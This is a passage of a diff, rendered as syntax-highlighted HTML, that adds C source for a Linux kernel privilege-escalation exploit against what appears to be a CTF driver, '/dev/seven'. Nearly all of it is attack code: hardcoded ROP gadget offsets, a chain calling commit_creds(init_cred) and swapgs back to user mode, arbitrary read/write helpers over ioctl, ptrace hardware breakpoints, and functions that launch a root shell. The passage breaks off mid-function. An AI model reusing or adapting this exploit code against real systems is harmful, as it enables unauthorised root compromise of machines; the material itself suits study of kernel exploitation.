+</span></span><span class="line"><span class="cl"><span class="kt">size_t</span>  <span class="n">pop_rsp_ret</span> <span class="o">=</span> <span class="mh">0x2af92f</span> <span class="o">+</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">size_t</span>  <span class="n">swapgs_restore_regs_and_return_to_usermode</span> <span class="o">=</span> <span class="mh">0x1000f01</span><span class="o">+</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">size_t</span>  <span class="n">add_rsp_0x18_pop_rbx_pop_rbp_ret</span> <span class="o">=</span> <span class="mh">0x18be788</span> <span class="o">+</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">size_t</span>  <span class="n">ret</span> <span class="o">=</span> <span class="mh">0x00038d</span> <span class="o">+</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">typ_cmd</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">val</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">vuln_fd</span><span class="p">,</span><span class="n">vuln_fd1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">pid_t</span> <span class="n">child</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">pid_t</span> <span class="n">trigger</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">sync_pipe</span><span class="p">[</span><span class="mi">2</span><span class="p">][</span><span class="mi">2</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// =-=-=-=-=-=-=-= FUNCTION =-=-=-=-=-=-=-=
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">get_shell</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">uid</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">uid</span> <span class="o">=</span> <span class="nf">getuid</span><span class="p">()))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;root get!!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">execl</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">,</span> <span class="s">&#34;sh&#34;</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">die</span><span class="p">(</span><span class="s">&#34;gain root failed, uid: %d&#34;</span><span class="p">,</span> <span class="n">uid</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">size_t</span> <span class="n">user_cs</span><span class="p">,</span> <span class="n">user_ss</span><span class="p">,</span> <span class="n">user_rflags</span><span class="p">,</span> <span class="n">user_sp</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">saveStatus</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">__asm__</span><span class="p">(</span><span class="s">&#34;mov user_cs, cs;&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34;mov user_ss, ss;&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34;mov user_sp, rsp;&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34;pushf;&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34;pop user_rflags;&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\033</span><span class="s">[34m</span><span class="se">\033</span><span class="s">[1m[*] Status has been saved.</span><span class="se">\033</span><span class="s">[0m</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">bind_cpu</span><span class="p">(</span><span class="kt">int</span> <span class="n">cpu_idx</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">cpu_set_t</span> <span class="n">my_set</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">CPU_ZERO</span><span class="p">(</span><span class="o">&amp;</span><span class="n">my_set</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">CPU_SET</span><span class="p">(</span><span class="n">cpu_idx</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">my_set</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">sched_setaffinity</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">cpu_set_t</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">my_set</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">die</span><span class="p">(</span><span class="s">&#34;sched_setaffinity: %m&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">#define DR_OFFSET(num) ((void *)(&amp;((struct user *)0)-&gt;u_debugreg[num]))
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">void</span> <span class="nf">create_hbp</span><span class="p">(</span><span class="kt">pid_t</span> <span class="n">pid</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">addr</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;create_hbp&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// Set DR0: HBP address
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nf">ptrace</span><span class="p">(</span><span class="n">PTRACE_POKEUSER</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="nf">DR_OFFSET</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">addr</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">die</span><span class="p">(</span><span class="s">&#34;create hbp ptrace dr0: %m&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="cm">/* Set DR7: bit 0 enables DR0 breakpoint. Bit 8 ensures the processor stops
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * on the instruction which causes the exception. bits 16,17 means we stop
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * on data read or write. */</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">dr_7</span> <span class="o">=</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">17</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">ptrace</span><span class="p">(</span><span class="n">PTRACE_POKEUSER</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="nf">DR_OFFSET</span><span class="p">(</span><span class="mi">7</span><span class="p">),</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">dr_7</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">die</span><span class="p">(</span><span class="s">&#34;create hbp ptrace dr7: %m&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">arb_write</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">val</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// struct typ_cmd cmd = {addr, val};
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x7201</span><span class="p">,</span><span class="n">addr</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x40</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x7202</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x7202</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x7203</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x7203</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x7203</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x7204</span><span class="p">,</span><span class="n">val</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="kt">long</span> <span class="kt">long</span> <span class="nf">arb_read</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">long</span> <span class="kt">long</span> <span class="n">ret_content</span> <span class="o">=</span> <span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x5555</span><span class="p">,</span><span class="n">addr</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">ret_content</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">do_init</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">logd</span><span class="p">(</span><span class="s">&#34;do init ...&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">saveStatus</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">vuln_fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/dev/seven&#34;</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// vuln_fd1 = open(&#34;/dev/seven&#34;, O_RDONLY);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="n">vuln_fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">die</span><span class="p">(</span><span class="s">&#34;open vuln_fd: %m&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// global mmap
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">void</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="nf">mmap</span><span class="p">(</span><span class="n">GLOBAL_MMAP_ADDR</span><span class="p">,</span> <span class="n">GLOBAL_MMAP_LENGTH</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                   <span class="n">MAP_PRIVATE</span> <span class="o">|</span> <span class="n">MAP_ANONYMOUS</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">p</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">die</span><span class="p">(</span><span class="s">&#34;mmap: %m&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">pipe</span><span class="p">(</span><span class="n">sync_pipe</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">die</span><span class="p">(</span><span class="s">&#34;pipe: %m&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">pipe</span><span class="p">(</span><span class="n">sync_pipe</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">die</span><span class="p">(</span><span class="s">&#34;pipe: %m&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">size_t</span>  <span class="o">*</span><span class="n">physmap_spray_arr</span><span class="p">[</span><span class="mi">16000</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="kt">size_t</span>  <span class="n">page_size</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">size_t</span>  <span class="n">try_hit</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span>     <span class="n">dev_fd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">uint64_t</span>  <span class="n">prepare_kernel_cred</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">getRootShell</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>   
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\033</span><span class="s">[32m</span><span class="se">\033</span><span class="s">[1m[+] Backing from the kernelspace.</span><span class="se">\033</span><span class="s">[0m&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nf">getuid</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\033</span><span class="s">[31m</span><span class="se">\033</span><span class="s">[1m[x] Failed to get the root!</span><span class="se">\033</span><span class="s">[0m&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\033</span><span class="s">[32m</span><span class="se">\033</span><span class="s">[1m[+] Successful to get the root. Execve root shell now...</span><span class="se">\033</span><span class="s">[0m&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="c1">// to exit the process normally instead of segmentation fault
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">constructROPChain</span><span class="p">(</span><span class="kt">size_t</span> <span class="o">*</span><span class="n">rop</span><span class="p">,</span><span class="kt">uint64_t</span> <span class="n">kernel_base</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">size_t</span>  <span class="n">commit_creds</span> <span class="o">=</span> <span class="mh">0x0bb5b0</span> <span class="o">+</span> <span class="n">kernel_base</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">size_t</span>  <span class="n">init_cred</span> <span class="o">=</span> <span class="mh">0x1a4cbf8</span> <span class="o">+</span> <span class="n">kernel_base</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">size_t</span>  <span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="mh">0x002c9d</span> <span class="o">+</span> <span class="n">kernel_base</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">size_t</span>  <span class="n">pop_rax_ret</span> <span class="o">=</span> <span class="mh">0x04e368</span> <span class="o">+</span> <span class="n">kernel_base</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">size_t</span>  <span class="n">pop_rsp_ret</span> <span class="o">=</span> <span class="mh">0x2af92f</span> <span class="o">+</span> <span class="n">kernel_base</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">size_t</span>  <span class="n">swapgs_restore_regs_and_return_to_usermode</span> <span class="o">=</span> <span class="mh">0x1000f01</span><span class="o">+</span> <span class="n">kernel_base</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">size_t</span>  <span class="n">add_rsp_0x18_pop_rbx_pop_rbp_ret</span> <span class="o">=</span> <span class="mh">0x18be788</span> <span class="o">+</span> <span class="n">kernel_base</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">size_t</span>  <span class="n">ret</span> <span class="o">=</span> <span class="mh">0x00038d</span> <span class="o">+</span> <span class="n">kernel_base</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">idx</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">raise</span><span class="p">(</span><span class="n">SIGSTOP</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(;</span> <span class="n">idx</span> <span class="o">&lt;</span> <span class="p">(</span><span class="n">page_size</span> <span class="o">/</span> <span class="mi">8</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">);</span> <span class="n">idx</span><span class="o">++</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">rop</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">ret</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// rop chain
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">rop</span><span class="p">[</span><span class="n">idx</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">pop_rdi_ret</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">rop</span><span class="p">[</span><span class="n">idx</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">init_cred</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">rop</span><span class="p">[</span><span class="n">idx</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">commit_creds</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">rop</span><span class="p">[</span><span class="n">idx</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">swapgs_restore_regs_and_return_to_usermode</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">rop</span><span class="p">[</span><span class="n">idx</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">size_t</span><span class="o">*</span><span class="p">)</span> <span class="s">&#34;arttnba3&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">rop</span><span class="p">[</span><span class="n">idx</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">size_t</span><span class="o">*</span><span class="p">)</span> <span class="s">&#34;arttnba3&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">rop</span><span class="p">[</span><span class="n">idx</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span> <span class="n">getRootShell</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">rop</span><span class="p">[</span><span class="n">idx</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_cs</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">rop</span><span class="p">[</span><span class="n">idx</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_rflags</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">rop</span><span class="p">[</span><span class="n">idx</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_sp</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">rop</span><span class="p">[</span><span class="n">idx</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_ss</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="kt">uint64_t</span> <span class="n">shell_addr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">getRootShell</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">fn_child</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">kernel_base</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">name_buf</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">GLOBAL_MMAP_ADDR</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">memset</span><span class="p">(</span><span class="n">GLOBAL_MMAP_ADDR</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">GLOBAL_MMAP_LENGTH</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">ptrace</span><span class="p">(</span><span class="n">PTRACE_TRACEME</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">die</span><span class="p">(</span><span class="s">&#34;ptrace PTRACE_TRACEME: %m&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">raise</span><span class="p">(</span><span class="n">SIGSTOP</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">commit_creds</span> <span class="o">=</span> <span class="mh">0x0bb5b0</span> <span class="o">+</span> <span class="n">kernel_base</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">init_cred</span> <span class="o">=</span> <span class="mh">0x1a4cbf8</span> <span class="o">+</span> <span class="n">kernel_base</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="mh">0x002c9d</span> <span class="o">+</span> <span class="n">kernel_base</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pop_rax_ret</span> <span class="o">=</span> <span class="mh">0x04e368</span> <span class="o">+</span> <span class="n">kernel_base</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pop_rsp_ret</span> <span class="o">=</span> <span class="mh">0x2af92f</span> <span class="o">+</span> <span class="n">kernel_base</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">swapgs_restore_regs_and_return_to_usermode</span> <span class="o">=</span> <span class="mh">0x1000f01</span><span class="o">+</span> <span class="n">kernel_base</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">add_rsp_0x18_pop_rbx_pop_rbp_ret</span> <span class="o">=</span> <span class="mh">0x18be788</span> <span class="o">+</span> <span class="n">kernel_base</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ret</span> <span class="o">=</span> <span class="mh">0x00038d</span> <span class="o">+</span> <span class="n">kernel_base</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;init_cred: %llx&#34;</span><span class="p">,</span><span class="n">init_cred</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;init_cred: %llx&#34;</span><span class="p">,</span><span class="n">pop_rdi_ret</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="nf">__asm__</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov r15, pop_rdi_ret;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov r14, init_cred;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov r13, commit_creds;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov r12, swapgs_restore_regs_and_return_to_usermode;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov rbp, 0;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov rbx, 0;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov r11, shell_addr;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov r10, user_cs;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov r9, user_rflags;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov r8, user_sp;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov rax,user_ss;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov rcx,0;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov rdx, 0;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov rsi, 0;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov rdi, 0x12340000;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov rsi, [rdi];&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// uname(name_buf);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// *name_buf = 1;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">fn_trigger</span><span class="p">()</span> <span class="p">{</span>
